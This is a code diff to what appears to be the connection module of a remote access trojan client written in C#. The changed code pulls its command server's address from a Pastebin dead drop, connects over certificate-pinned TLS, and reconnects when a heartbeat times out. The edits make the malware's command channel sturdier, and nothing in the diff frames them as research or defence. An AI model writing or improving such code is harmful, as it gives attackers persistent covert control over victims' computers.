@@ -32,6 +32,7 @@ namespace Client.Connection
         private static Timer Ping { get; set; } //Send ping interval
         public static int Interval { get; set; } //ping value
         public static bool ActivatePong { get; set; }
+        private const int HeartbeatTimeoutMs = 15000;
 
 
         public static void InitializeClient() //Connect & reconnect
@@ -71,16 +72,7 @@ namespace Client.Connection
                 }
                 else
                 {
-                    using (WebClient wc = new WebClient())
-                    {
-                        NetworkCredential networkCredential = new NetworkCredential("", "");
-                        wc.Credentials = networkCredential;
-                        string resp = wc.DownloadString(Settings.Pastebin);
-                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
-                        Settings.Hosts = spl[0];
-                        Settings.Ports = spl[new Random().Next(1, spl.Length)];
-                        TcpClient.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
-                    }
+                    TryResolveFromPastebin();
                 }
 
                 if (TcpClient.Connected)
@@ -88,7 +80,7 @@ namespace Client.Connection
                     Debug.WriteLine("Connected!");
                     IsConnected = true;
                     SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
-                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls12 | SslProtocols.Tls11, true);
                     HeaderSize = 4;
                     Buffer = new byte[HeaderSize];
                     Offset = 0;
@@ -120,9 +112,6 @@ namespace Client.Connection
 
         private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
         {
-#if DEBUG
-            return true;
-#endif
             return Settings.ServerCertificate.Equals(certificate);
         }
 
@@ -277,9 +266,39 @@ namespace Client.Connection
                 if (ActivatePong && IsConnected)
                 {
                     Interval++;
+                    if (Interval >= HeartbeatTimeoutMs)
+                    {
+                        Debug.WriteLine("Heartbeat timeout, reconnecting...");
+                        IsConnected = false;
+                        Reconnect();
+                    }
                 }
             }
             catch { }
+        }
+
+        private static void TryResolveFromPastebin()
+        {
+            try
+            {
+                using (WebClient wc = new WebClient())
+                {
+                    wc.Credentials = new NetworkCredential("", "");
+                    string resp = wc.DownloadString(Settings.Pastebin).Trim();
+                    string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.RemoveEmptyEntries);
+                    if (spl.Length < 2)
+                        throw new InvalidDataException("Pastebin payload missing host/port pair");
+
+                    Settings.Hosts = spl[0];
+                    Settings.Ports = spl[new Random().Next(1, spl.Length)];
+                    TcpClient.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Pastebin resolution failed: {ex.Message}");
+                IsConnected = false;
+            }
         }
     }
 }
